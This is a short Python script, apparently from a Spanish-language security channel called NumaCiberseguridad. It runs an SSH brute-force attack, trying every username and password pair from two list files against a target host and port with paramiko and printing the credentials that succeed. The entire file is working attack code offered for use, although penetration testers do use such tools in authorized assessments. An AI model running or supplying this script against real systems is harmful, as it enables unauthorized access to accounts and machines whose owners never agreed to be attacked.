
#!/usr/bin/python

import paramiko
import time
import argparse

def ssh_conection(host, puerto, user, password):
	log = paramiko.util.log_to_file('log.log')
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=puerto, username=user, password=password)
		print("\033[;36m"+"Las credenciales son: "+'\033[0;m')
		print("El Usuario es :",user)
		print("El Password es: ",password)

	except:
		print("\033[1;33m"+"no se ha encontrado credenciales en:"+'\033[0;m')
		print("Usuario :",user)
		print("Password", password)





parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, 
                                 description="###############         NumaCiberseguridad       ###############\n" \
                                             "          Simple brute force ssh\n"
                                             "Usar: python ssh.py --host IP --port PORT --U Lista de usuario --P Lista de password\n\n" \
                                             "Demo: xxxxxxxxxxxxxxxxxxxx\n"\
                       "GitHub:  github.com/numaciberseguridad\n")

parser.add_argument('--host', action = 'store', dest = 'host', required = True, help = 'Digitar la IP')
parser.add_argument('--port', action = 'store', type=int, dest = 'port', required = True, help = 'Port')
parser.add_argument('--U', action = 'store', dest = 'Usuario', required = True, help = 'Listado de Usuario')
parser.add_argument('--P', action = 'store', dest = 'Password', required = True, help = 'Listado de Password')

arguments = parser.parse_args()

HOST = arguments.host
PORT = arguments.port
lista_usuario = arguments.Usuario
lista_password = arguments.Password

usuario = open(lista_usuario, 'r')

for usuario in usuario.read().split("\n"):
	password = open(lista_password, 'r')
	for password in password.read().split("\n"):
		ssh_conection(HOST, PORT, usuario, password)
